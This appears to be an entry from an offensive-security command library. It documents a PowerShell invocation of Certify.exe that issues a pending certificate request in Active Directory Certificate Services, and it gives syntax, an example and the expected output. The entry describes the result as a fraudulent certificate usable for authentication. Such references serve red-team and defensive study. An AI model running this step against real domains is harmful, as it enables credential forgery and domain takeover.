---
type: command
executor: powershell
data: 'Certify.exe issue /id:$_REQUEST_ID'
output: null
platforms:
  - Windows
tags:
  - adcs
  - certificate-issue
verified: true
validated: true
---

# certify-issue-certificate

## Command

```powershell
Certify.exe issue /id:$_REQUEST_ID
```

## Description

Issues a pending certificate request, granting the fraudulent certificate for use in authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /id:$_REQUEST_ID | ID of the pending request | Yes |

## Examples

### Basic Usage

```powershell
Certify.exe issue /id:12345
```

## Expected Output

"Certificate issued successfully. Exported to request_12345.pfx"

## Related

- [[procedures/Vulnerable-Certificate-Authority-Access-Control]]
